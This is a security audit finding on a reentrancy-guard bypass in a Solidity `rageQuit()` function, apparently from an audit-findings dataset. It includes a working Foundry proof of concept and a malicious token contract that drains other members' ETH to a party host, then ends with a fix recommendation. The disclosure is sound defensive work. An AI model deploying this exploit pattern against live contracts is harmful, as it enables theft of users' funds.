# [M] Reentrancy guard in `rageQuit`

## Summary
Severity: Medium
Contest weight: 0.6860
Dataset id: 18683
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The reentrancy guard present in the `rageQuit()` function can be bypassed by host accounts, leading to reentrancy attack vectors and loss of funds.

The new `rageQuit()` function can be used by party members to exit their position and obtain their share of the tokens held by the party contract. In order to prevent function reentrancy while sending ETH or transferring ERC20 tokens, the implementation reuses the `rageQuitTimestamp` variable as a guard to check if the function is being called again while executing.

```solidity
function rageQuit(
    uint256[] calldata tokenIds,
    IERC20[] calldata withdrawTokens,
    address receiver
) external {
    // Check if ragequit is allowed.
    uint40 currentRageQuitTimestamp = rageQuitTimestamp;
    if (currentRageQuitTimestamp != ENABLE_RAGEQUIT_PERMANENTLY) {
        if (
            currentRageQuitTimestamp == DISABLE_RAGEQUIT_PERMANENTLY ||
            currentRageQuitTimestamp < block.timestamp
        ) {
            revert CannotRageQuitError(currentRageQuitTimestamp);
        }
    }

    // Used as a reentrancy guard. Will be updated back after ragequit.
    delete rageQuitTimestamp;
             
             ...
             
    // Update ragequit timestamp back to before.
    rageQuitTimestamp = currentRageQuitTimestamp;

    emit RageQuit(tokenIds, withdrawTokens, receiver);
}
```

The implementation deletes the value of `rageQuitTimestamp` (which sets it to zero) in line 310. The intention is to use this variable to prevent reentrancy, as setting it to zero will block any call due to the check in line 303, `block.timestamp` will be greater than zero and will lead to the revert in line 305. After NFTs are burned and tokens are transferred, the function restores the original value in line 350.

This reentrancy guard can still be bypassed using `setRageQuit()`. If execution control is transferred to the attacker, then the attacker can call `setRageQuit()` to reset the value to anything greater than `block.timestamp`, allowing the reentrancy on the `rageQuit()` function. Note that this would require the attacker to be a party host or be in complicity with a party host.

The general scenario to trigger the reentrancy is as follows:

  1. User calls `rageQuit()`.
  2. ETH or ERC20 transfers control to the attacker. This can be in different forms:

     * ETH transfers to contracts that invoke the `receive()` or `fallback()` function.
     * Variations of the ERC20 tokens that have callbacks during transfers (e.g. ERC777)
     * Poisoned ERC20 implementation that receives control during the `transfer()` call itself.
  3. Attacker resets the `rageQuitTimestamp` by calling `setRageQuit(block.timestamp + 1)`.
  4. Attacker reenters the `rageQuit()` function.

The issue can be exploited to disable the reentrancy guard in the `rageQuit()` function, leading to further attacks. We will explore a scenario of potential loss of funds in the next section.

## Proof of Concept
The following is an adaptation of the test `testRageQuit_cannotReenter()` present in the PartyGovernanceNFT.t.sol test suite, with minimal variations to enable the described attack.

Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/9a9868c7c3f540811eff6853db14bfc6).

```solidity
function test_PartyGovernanceNFT_ReentrancyAttack() external {
   address alice = makeAddr("alice");
   address host = makeAddr("host");

   (Party party, , ) = partyAdmin.createParty(
      partyImpl,
      PartyAdmin.PartyCreationMinimalOptions({
            host1: address(this),
            host2: host,
            passThresholdBps: 5100,
            totalVotingPower: 100,
            preciousTokenAddress: address(toadz),
            preciousTokenId: 1,
            rageQuitTimestamp: 0,
            feeBps: 0,
            feeRecipient: payable(0)
      })
   );

   vm.prank(address(this));
   party.setRageQuit(uint40(block.timestamp) + 1);

   // Mint voting NFTs, alice and host have both 50%
   vm.prank(address(partyAdmin));
   uint256 aliceTokenId = party.mint(alice, 50, alice);
   vm.prank(address(partyAdmin));
   uint256 hostTokenId = party.mint(host, 50, host);

   // Host (attacker) deploys malicious ReenteringContract
   ReenteringContract reenteringContract = new ReenteringContract(party, hostTokenId, host);

   // Host sends his NFT to the contract
   vm.prank(host);
   party.transferFrom(host, address(reenteringContract), hostTokenId);

   // Host transfer host feature to contract
   vm.prank(host);
   party.abdicateHost(address(reenteringContract));

   // Simulate there is 1 ETH in the party
   vm.deal(address(party), 1 ether);

   // Alice decides to rage quit

   IERC20[] memory tokens = new IERC20[](2);
   tokens[0] = IERC20(address(reenteringContract));
   tokens[1] = IERC20(ETH_ADDRESS);

   uint256[] memory tokenIds = new uint256[](1);
   tokenIds[0] = aliceTokenId;

   vm.prank(alice);
   party.rageQuit(tokenIds, tokens, alice);

   // Alice has 0 ETH while the host (attacker) has all the funds
   assertEq(alice.balance, 0);
   assertEq(host.balance, 1 ether);
}

contract ReenteringContract is ERC721Receiver {
    Party party;
    uint256 tokenId;
    address attacker;

    constructor(Party _party, uint256 _tokenId, address _attacker) {
        party = _party;
        tokenId = _tokenId;
        attacker = _attacker;
    }

    function balanceOf(address) external returns (uint256) {
        return 1337;
    }

    function transfer(address, uint256) external returns (bool) {
        // Disable reentrancy guard
        party.setRageQuit(uint40(block.timestamp + 1));

        // Return host to attacker
        party.abdicateHost(attacker);

        // Execute attack
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        party.rageQuit(tokenIds, tokens, address(this));
        return true;
    }

    fallback() external payable {
        // sends funds to attacker
        payable(attacker).transfer(address(this).balance);
    }
}
```

## Recommendation
Implement a reentrancy guard using a dedicated variable that acts as the flag, such as the one available in the [OpenZeppelin contracts library](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard).

Alternatively, if the intention is to reuse the same `rageQuitTimestamp` variable, set it temporarily to `DISABLE_RAGEQUIT_PERMANENTLY` instead of zero. This will prevent calling `setRageQuit()` to reset the `rageQuitTimestamp` variable while also blocking calls to `rageQuit()`.
